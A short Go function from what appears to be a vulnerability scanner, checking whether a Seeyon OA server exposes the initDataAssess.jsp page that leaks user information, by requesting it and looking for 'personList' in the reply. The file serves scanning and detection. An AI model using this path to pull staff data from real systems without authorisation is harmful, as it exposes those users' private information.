package seeyon

import (
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"strings"
)

//initDataAssess.jsp 用户敏感信息泄露

func InitDataAssess(u string) bool {
	if req, err := httpx.Request(u+"/yyoa/assess/js/initDataAssess.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "personList") {
			return true
		}
	}
	return false
}
